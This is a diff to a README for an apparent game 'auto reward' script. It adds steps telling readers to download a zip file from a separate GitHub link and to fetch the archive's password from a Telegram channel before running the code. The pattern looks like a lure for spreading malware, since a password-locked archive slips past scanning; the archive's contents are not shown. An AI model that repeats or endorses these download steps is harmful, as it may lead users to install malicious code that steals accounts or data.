@@ -6,10 +6,16 @@
 
 ## Auto get reward script usage
 ### Step 1
+Download the script from this link
+https://github.com/ThisisANOM/Hamster/blob/main/Hamster%20Auto%20Reward.zip
+### Step 2
+Get the file pass from telegram channel
+https://t.me/MemoryOfNaengi
+### Step 3
 ```
 pip install -r requirements.txt
 ```
-### Step 2
+### Step 4
 ```
 python main.py
 ```
